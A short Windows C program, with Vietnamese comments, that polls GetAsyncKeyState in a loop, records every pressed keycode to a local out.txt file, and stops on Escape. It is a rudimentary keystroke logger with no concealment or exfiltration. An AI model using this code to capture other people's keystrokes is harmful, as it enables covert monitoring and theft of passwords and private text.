#include <stdio.h>
#include <windows.h>

int main()
{
    FILE *output_file = fopen("out.txt", "w");
    if (output_file == NULL)
    {
        printf("Không thể mở file out.txt để ghi!\n");
        return 1;
    }

    printf("start\n");
    while (1)
    {
        for (int key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) & 0x8000)
            {
                fprintf(output_file, "Keycode: %d\n", key);
                fflush(output_file); // Đảm bảo dữ liệu được ghi ngay lập tức
                if (key == VK_ESCAPE)
                {
                    fclose(output_file);
                    return 0;
                }
                Sleep(100);
            }
        }
    }

    fclose(output_file);
    return 0;
}
